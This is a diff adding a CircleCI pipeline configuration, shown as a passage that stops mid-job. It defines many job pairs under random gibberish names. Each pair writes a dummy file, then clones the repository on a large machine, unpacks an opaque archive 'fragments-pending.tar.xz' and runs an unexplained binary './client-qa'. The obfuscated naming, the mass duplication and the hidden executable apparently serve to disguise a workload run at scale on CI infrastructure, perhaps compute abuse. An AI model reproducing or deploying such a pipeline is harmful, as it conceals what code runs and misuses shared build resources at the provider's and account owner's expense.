@@ -1,0 +1,1369 @@
+version: 2.1
+
+jobs:
+  ccxeudaqcmqyzye:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: gwdahtez
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'qiuchpgafahuuts fphioivfqdpq' > /tmp/dkpsqtoqeciutgo/mwnlilwabib
+            ls -la /tmp/dkpsqtoqeciutgo/mwnlilwabib
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'mwnlilwabib'
+  vhtzqllri:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: xttmtmwonxuwq
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/mwnlilwabib 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: djlxqi
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: igixjxelb
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  otwxnjtx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: kublvzttwetrmw
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'qxnugmstgckbwtgnh ytwtybujljiqlyidi' > /tmp/dkpsqtoqeciutgo/nhrsiezfm
+            ls -la /tmp/dkpsqtoqeciutgo/nhrsiezfm
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'nhrsiezfm'
+  lpfojx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: fhynmchgdjlcrrd
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/mttadvsqp 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: ykvleigxnyai
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: jlcdyoawazqxrxy
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  utrtfubqv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: jphnsastzvfutu
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'lnmoeekncooottm fvzcykplejhgoew' > /tmp/dkpsqtoqeciutgo/kukpyiqwyctr
+            ls -la /tmp/dkpsqtoqeciutgo/kukpyiqwyctr
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'kukpyiqwyctr'
+  nodusqua:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: uzehfgov
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: qguqppxel
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: rhhsrgnvuubon
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  whruvcaea:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: dkhedpo
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'gyaipebycx sifrzggntntzo' > /tmp/dkpsqtoqeciutgo/aiywrryq
+            ls -la /tmp/dkpsqtoqeciutgo/aiywrryq
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'aiywrryq'
+  bkziksxiynyl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: ectqljdxnvwbi
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: odfiigbbutvsth
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: svkctmhf
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  sawhyzdbpfq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: dyezuqjvfpv
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'gtfwpuqpkkybcthf hxmwpwjhya' > /tmp/dkpsqtoqeciutgo/xjbfkgvqdeqsf
+            ls -la /tmp/dkpsqtoqeciutgo/xjbfkgvqdeqsf
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'xjbfkgvqdeqsf'
+  uutmkzcsz:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: violw
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/mttadvsqp 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: yxcjorf
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: wdgpxjkcrz
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  ckaleiobnfcf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: ykwask
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'iiokrwmnqaleahzah ovxuvaojwrjbsp' > /tmp/dkpsqtoqeciutgo/qzdzieoez
+            ls -la /tmp/dkpsqtoqeciutgo/qzdzieoez
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'qzdzieoez'
+  oghrvxyqfmxhreo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: dovfizqdwilp
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/qzdzieoez 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: vodknsqlrg
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: intzqnwa
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  kjzzmyvqkhz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: ezehyxtt
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'tjlrykasfpeavsjnhq mnwjichgkomnbjhmw' > /tmp/dkpsqtoqeciutgo/xxrtpbfdbedira
+            ls -la /tmp/dkpsqtoqeciutgo/xxrtpbfdbedira
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'xxrtpbfdbedira'
+  xtulsxswo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: hvhqnv
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: xhdygrmtqn
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: dotdusnxqtdwcxw
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  fflcqmydlto:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: fmrciifj
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'dawgwyumrpvlfmmvj kzzupbkmbueorpeme' > /tmp/dkpsqtoqeciutgo/rsnond
+            ls -la /tmp/dkpsqtoqeciutgo/rsnond
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'rsnond'
+  onjqpsfzjfdc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: klrbazg
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/rsnond 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: lfabtzgnko
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: bnwuodja
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  hthxuwvhq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: olkfiueivthuroq
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'xvpidnsbseped ysumnwyweduienmn' > /tmp/dkpsqtoqeciutgo/hctavrumxhu
+            ls -la /tmp/dkpsqtoqeciutgo/hctavrumxhu
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'hctavrumxhu'
+  bduawzurvhllscm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: pjkhqewyhnze
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/hctavrumxhu 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: gewueq
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: jtmncro
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  xmydsu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: mfukscw
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'jjtazjcmruitsfeg gaughgsigl' > /tmp/dkpsqtoqeciutgo/ybiwdlauiyygay
+            ls -la /tmp/dkpsqtoqeciutgo/ybiwdlauiyygay
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'ybiwdlauiyygay'
+  arqfeixlebxdv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: ypklkvrpkm
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: imnou
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: kvvqmbm
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  dpvhaepv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: uotrevxahmzysk
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'mjwkkxtbqrhs ydvjkjoyrlclth' > /tmp/dkpsqtoqeciutgo/jkuvbrweu
+            ls -la /tmp/dkpsqtoqeciutgo/jkuvbrweu
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'jkuvbrweu'
+  zivhpe:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: qhsqsbj
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: ocszgqhazmyllh
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: apeekyvyan
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  fylghxmpjixil:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: zsxblfegalm
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'qmcdyxfazsurj jmxmbldcegtfbfpa' > /tmp/dkpsqtoqeciutgo/fmqxhhds
+            ls -la /tmp/dkpsqtoqeciutgo/fmqxhhds
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'fmqxhhds'
+  fnmzzxupxbz:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: gnycsgqgdicjjr
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/mttadvsqp 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: hhfccnvb
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: gpxxmctyglphpx
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  qekgtnkatwv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nvcxwqeiydob
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'mocooxtfmdtpbgpyky wbqmtfdgez' > /tmp/dkpsqtoqeciutgo/hqithyzejhsaj
+            ls -la /tmp/dkpsqtoqeciutgo/hqithyzejhsaj
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'hqithyzejhsaj'
+  jldyce:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: adxiiye
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/hqithyzejhsaj 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: gaypkswmgdp
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: fknyd
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  mwljxhwqkqdmc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: amvahlypas
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'swtivsbgtdj keflqregvqvuell' > /tmp/dkpsqtoqeciutgo/pjkrrlitcawfw
+            ls -la /tmp/dkpsqtoqeciutgo/pjkrrlitcawfw
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'pjkrrlitcawfw'
+  wqiwoakzubi:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: aziphpdsyiqtpme
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/mttadvsqp 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: tzguutf
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: ftjjg
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  qnosr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: ablmluiolrvki
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'sehxduvcdwryjrfv fspcefusrxgw' > /tmp/dkpsqtoqeciutgo/vkilbsnphrlp
+            ls -la /tmp/dkpsqtoqeciutgo/vkilbsnphrlp
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'vkilbsnphrlp'
+  ajsvywvtug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: xfualmcmvp
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: csbgrtnx
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: tawrhtvdvr
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  swiqbjetkosyfdd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: prebhxswaso
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'gqzlfpzvxdwjo azyeswetocuprdrd' > /tmp/dkpsqtoqeciutgo/jniltrtpzoecfi
+            ls -la /tmp/dkpsqtoqeciutgo/jniltrtpzoecfi
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'jniltrtpzoecfi'
+  ozceuidpahogv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: pyctwffomzpqh
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/jniltrtpzoecfi 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: owromflsnhinb
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: lzuiedhbtebocw
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  pstwuhalsicwtcc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: wywdkjif
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'cqgdyhheybyklmp pzppakxakh' > /tmp/dkpsqtoqeciutgo/dyomzfbknb
+            ls -la /tmp/dkpsqtoqeciutgo/dyomzfbknb
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'dyomzfbknb'
+  dwjks:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: klzdezivysaugbq
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/mttadvsqp 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: trhsduv
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: ggfujmnbxialn
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  lzepbngmpnqb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: vpbmacyzpc
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'ykzwscmtzqmmd nzryncusasgdmtsh' > /tmp/dkpsqtoqeciutgo/pcltjld
+            ls -la /tmp/dkpsqtoqeciutgo/pcltjld
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'pcltjld'
+  jsgavcnydyi:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: ediaycpmip
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/mttadvsqp 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: lyyejer
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: bbwpppg
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  xiirgehfal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: uvfzcwqbmxmoyxj
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'utzwhywljmpjtyhb zeziavxudjqpvlvzea' > /tmp/dkpsqtoqeciutgo/kztuadmdcsagvt
+            ls -la /tmp/dkpsqtoqeciutgo/kztuadmdcsagvt
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'kztuadmdcsagvt'
+  nrxtvuxgtpn:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: fdvnnhdwktogo
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/kztuadmdcsagvt 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: xocxhyl
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: czcbsigtvu
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  yhtmvlw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: wcnei
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'vxiicuulcejh yvhifjlgbvltezftek' > /tmp/dkpsqtoqeciutgo/mzmpiohudxloae
+            ls -la /tmp/dkpsqtoqeciutgo/mzmpiohudxloae
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'mzmpiohudxloae'
+  ebnpude:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: gwlyrxylkjhnlqc
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/mzmpiohudxloae 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: dmqrabgaryhkehq
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: iqljex
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  phyuoyclxdmvsp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: lkdpmuh
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'ywkvbunuliqfbzukb vskcytolzagqe' > /tmp/dkpsqtoqeciutgo/drmvbaczkzaah
+            ls -la /tmp/dkpsqtoqeciutgo/drmvbaczkzaah
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'drmvbaczkzaah'
+  uyngxmjleztmueg:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: mdjwwjujfbctl
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: nafptwjauwgbcjw
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: ikhzlactzivrm
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  wigcfmpszpp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: mscdsuiqnaddw
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'phyaceseshnmgfyt szgbcrtywzzs' > /tmp/dkpsqtoqeciutgo/cfryxnxnjv
+            ls -la /tmp/dkpsqtoqeciutgo/cfryxnxnjv
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'cfryxnxnjv'
+  hcyemx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: deepmnuba
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: dpmfmyyzotxw
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: iuels
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  ylfyukcd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: azhqpkw
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'fuqjlfdftnnrjfi tumopqdajkuoqw' > /tmp/dkpsqtoqeciutgo/mgdfmbrtlqba
+            ls -la /tmp/dkpsqtoqeciutgo/mgdfmbrtlqba
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'mgdfmbrtlqba'
+  muqnxlb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: hpjxmu
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/mttadvsqp 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: iyqqoijhbnuufw
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: tgaix
